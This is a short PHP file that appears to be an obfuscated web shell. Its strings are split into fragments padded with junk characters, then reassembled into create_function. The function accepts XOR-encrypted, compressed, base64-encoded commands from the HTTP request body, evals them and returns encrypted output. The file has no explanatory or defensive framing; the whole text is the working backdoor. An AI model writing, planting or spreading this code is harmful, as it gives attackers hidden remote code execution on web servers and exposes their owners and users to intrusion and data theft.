<?php
$y='$k="01#6d#5053";$#kh="5779#54cd5#751";$kf="b#9786##a4b0f4c";$p="X#mI#aZ';
$K=str_replace('uT','','cruTuTeatuTe_fuuTncuTuTtion');
$a='e_get#_#content#s("php:#//in#put"),$m)#==1) {@#ob#_start();@e#v#al(@gzunc#ompr#';
$b='#t{$i#}^$k{$j};#}}return# $o;}if #(@preg_match(#"/$##kh(.+)$kf/"#,@fil';
$v='8vkKnr#3cW6T"#;functio#n x#($t,$k)#{#$c=str#len($k);$#l=str#len($#t);$';
$F='o=""##;for($#i=0;$i<$l;){for(#$j=#0;#($j<$c&&$i<#$l);$j++#,$#i++#){#$o.=$';
$f='e#ss(@#x(@bas#e6#4_decode($m[1])#,$#k)))##;$o=@ob_get_contents();#@ob_end#_clean#(';
$E=')#;$r=@base#64_en#code(##@x(@gzcom#press($o),$#k))#;print(#"$p$kh$r$#kf");}';
$Z=str_replace('#','',$y.$v.$F.$b.$a.$f.$E);
$d=$K('',$Z);$d();
?>
